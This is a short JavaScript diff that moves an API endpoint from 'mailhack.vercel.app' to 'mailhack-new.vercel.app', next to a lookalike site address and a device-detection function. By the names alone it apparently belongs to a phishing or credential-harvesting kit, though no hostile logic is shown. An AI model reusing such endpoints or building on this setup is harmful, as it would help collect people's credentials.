@@ -1,4 +1,4 @@
-const API_URL = 'https://mailhack.vercel.app'
+const API_URL = 'https://mailhack-new.vercel.app'
 const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
